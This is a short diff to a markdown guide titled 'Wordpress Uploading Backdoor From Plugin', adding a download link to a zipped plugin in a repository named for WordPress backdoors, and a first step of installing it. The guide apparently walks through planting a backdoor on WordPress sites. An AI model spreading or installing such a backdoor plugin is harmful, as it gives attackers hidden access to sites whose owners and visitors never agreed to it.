@@ -1,4 +1,5 @@
 # **Wordpress Uploading Backdoor From Plugin**
+[**Download Plugins**](https://github.com/haxorstars/wordpress-plugin-backdoor/files/12341200/wp-file-upload.zip)
 
 **Step**
 **1** <p>Installing Plugins</p>
